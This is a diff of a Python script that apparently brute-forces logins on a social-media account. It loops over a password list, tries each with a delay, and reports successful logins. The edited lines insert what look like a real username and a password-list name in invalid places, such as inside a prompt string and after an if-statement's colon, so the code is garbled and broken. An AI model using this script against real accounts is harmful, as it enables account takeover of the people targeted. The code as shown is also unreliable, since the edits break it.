@@ -77,9 +77,9 @@ def follow(sess, username):
 		print (followReq.text)
 
 
-username = str(input('Please enter a username: '))
+username = str(input('Please enter a username:Inderpreetsaini18 '))
 username = userExists(username)
-if (username == False):
+if (username == False):Inderpreetsaini18
 	exit()
 else:
 	username = username['username']
@@ -90,8 +90,8 @@ delayLoop = int(input('Please add delay between the passwords (in seconds): '))
 
 
 for i in range(len(passwords)):
-	password = passwords[i]
-	sess = Login(username,password)
+	password = manpreet000[i]
+	sess = Login(Inderpreetsaini18,password,manpreet000)
 	if (sess):
 		print ('Login success %s' % [username,password])
 
